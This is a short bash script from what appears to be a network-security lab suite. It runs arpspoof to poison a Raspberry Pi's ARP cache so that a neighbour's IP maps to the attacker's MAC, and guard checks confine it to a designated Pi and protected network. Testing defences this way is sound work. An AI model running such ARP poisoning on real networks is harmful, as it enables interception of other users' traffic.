#!/usr/bin/env bash
# ARP poisoning (arpspoof): tell the Pi that a neighbour's IP is at my MAC. Pi only. Attacker host only.
#   bash lab/attacks/arp_poison.sh --target <pi-ip> --spoof-ip <neighbour ip, in the LAN> --iface IF \
#        --pi-ip IP --victim-net CIDR --protected-net CIDR [--duration 30] [--dry-run]
source "$(dirname "${BASH_SOURCE[0]}")/_common.sh"
parse_common "$@"
SPOOF=""
set -- "${REST[@]}"
while (($#)); do
  case "$1" in
    --spoof-ip) SPOOF="${2:?}"; shift ;;
    *) no_extra_args "$@" ;;
  esac
  shift
done
require_pi_target
require_iface
[[ -n "$SPOOF" ]] || refuse "--spoof-ip (the neighbour whose address is claimed) is required"
require_in_protected "$SPOOF" "--spoof-ip"
[[ "$SPOOF" != "$PI_IP" ]] || refuse "--spoof-ip must be a neighbour, not the Pi"
tool_version arpspoof
run_attack arpspoof -i "$IFACE" -t "$DEST" "$SPOOF"
